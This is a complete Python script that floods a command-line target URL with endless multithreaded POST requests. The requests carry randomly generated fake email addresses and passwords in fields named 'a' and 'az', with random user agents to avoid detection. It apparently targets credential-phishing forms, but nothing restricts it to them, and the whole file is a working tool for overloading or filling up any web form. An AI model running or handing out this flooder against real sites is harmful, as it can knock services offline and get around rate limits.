import threading
import requests
import random
import string
import names
import subprocess
import argparse
from fake_useragent import UserAgent

# Generates a random name for the email
def name_gen():
    name_system = random.choice(["FullName", "FullFirstFirstInitial", "FirstInitialFullLast"])
    first_name = names.get_first_name()
    last_name = names.get_last_name()
    if name_system == "FullName":#JohnDoe
        return first_name + last_name
    elif name_system == "FullFirstFirstInitial":#JohnD
        return first_name + last_name[0]
    return first_name[0] + last_name#JDoe

def generate_random_email():
    name = name_gen()
    NumberOrNo=random.choice(["Number", "No"])
    domain = random.choice(["@gmail.com", "@yahoo.com", "@rambler.ru", "@protonmail.com", "@outlook.com", "@itunes.com"])#Popular email providers
    if NumberOrNo == "Number":
        return name + str(random.randint(1, 100)) + domain
    else:
        return name + domain

def generate_random_password():
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))

def send_posts(url):
    while True:
        email = generate_random_email()
        password = generate_random_password()
        data = {"a": email, "az": password}
        ua = UserAgent()
        user_agent = ua.random
        headers = {'User-Agent': user_agent}
        response = requests.post(url, data=data, headers=headers,)
        print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}, headers: {user_agent}")

def main():
    parser = argparse.ArgumentParser(description="Flood a target URL with POST requests.")
    parser.add_argument('--url', type=str, required=True, help='Target URL to flood')
    parser.add_argument('--threads', type=int, default=25, help='Number of threads to use')
    args = parser.parse_args()

    threads = [threading.Thread(target=send_posts, args=(args.url,), daemon=True) for _ in range(args.threads)]

    for t in threads:
        t.start()

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
